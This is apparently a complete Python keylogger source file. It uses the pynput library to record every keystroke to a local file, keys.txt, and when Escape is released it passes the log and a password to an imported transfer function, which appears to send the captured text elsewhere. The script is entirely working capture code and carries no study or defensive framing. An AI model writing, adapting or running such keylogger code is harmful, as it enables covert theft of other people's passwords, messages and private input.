#!/usr/bin/env python3

from typing import Union
from pynput import keyboard
from transfer import transfer
from file_to_str import file_to_str

keys = []


def strip_apostrophe(key: Union[keyboard.Key, keyboard.KeyCode]) -> str:
    return str(key).replace("'", "")


def format_modifier_key(key: keyboard.Key) -> str:
    key = strip_apostrophe(key)
    key = key.replace("Key.", "")
    return f"[{key}]"


def format_special_key(key: keyboard.Key) -> str:
    if key == keyboard.Key.space:
        return " "
    elif key == keyboard.Key.enter:
        return "\n"
    elif key == keyboard.Key.esc:
        return ""

    # If the input is an invisible modifier key (e.g. Shift, Alt)
    # surrond it with brackets.
    return format_modifier_key(key)


def format_key(key: Union[keyboard.Key, keyboard.KeyCode]) -> str:
    if isinstance(key, keyboard.Key):
        return format_special_key(key)
    return strip_apostrophe(key)


def write_to_file(keys: list):
    with open('keys.txt', 'w') as file:
        for key in keys:
            file.write(format_key(key))


# Boilerplate from pynput docs
# https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard

def on_press(key: Union[keyboard.Key, keyboard.KeyCode]):
    keys.append(key)
    write_to_file(keys)


def on_release(key: Union[keyboard.Key, keyboard.KeyCode]):
    if key == keyboard.Key.esc:
        transfer(file_to_str('keys.txt'), password)
        return False


password = input("Password: ")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
